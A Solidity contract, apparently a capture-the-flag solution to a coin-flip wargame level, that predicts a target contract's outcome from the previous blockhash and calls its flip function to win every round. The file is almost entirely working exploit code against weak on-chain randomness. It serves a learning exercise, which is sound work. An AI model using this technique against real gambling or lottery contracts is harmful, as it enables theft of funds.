// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

// create an interface to call the contract
interface ICoin {
    function flip(bool _guess) external returns (bool);
    function consecutiveWins() external view returns (uint256);
}

contract CoinFlip {
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
    uint256 lastHash;
    address flip_contract = 0x1eCA455D570204Ac008B7d00E5932daa08e22dC7; // this will be your contract.address
    ICoin flipCoin = ICoin(flip_contract);
    
    uint256 winTime = 0;

    // call the fake flip function 10 times, then we will win
    function fake_flip() public {
        uint256 blockValue = uint256(blockhash(block.number - 1));

        if (lastHash == blockValue) {
            revert();
        }

        lastHash = blockValue;
        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;
        // call the actual flip coin function
        flipCoin.flip(side);
        winTime = flipCoin.consecutiveWins();
    }

    // track the actual winning number
    function get_Win_number() view public returns(uint256){
        return winTime;
    }
}
